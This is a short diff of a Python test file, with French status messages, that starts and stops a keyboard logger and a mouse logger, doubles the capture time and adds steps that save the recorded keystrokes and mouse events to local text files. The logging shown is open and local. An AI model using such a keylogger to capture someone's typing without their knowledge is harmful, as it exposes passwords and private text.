@@ -21,11 +21,13 @@ def test_threading():
     print("keylog lancé")
     mlog.start()
     print("mouselog lancé")
-    time.sleep(5)
+    time.sleep(10)
     klog.stop()
     print("keylog arrêté")
     mlog.stop()
     print("mouselog arrêté")
+    klog.write_on_file("test/keyboard.txt")
+    mlog.write_on_file("test/mouse.txt")
 
 def test_keylog(waittime):
     klog = keylog.KeyLogger()
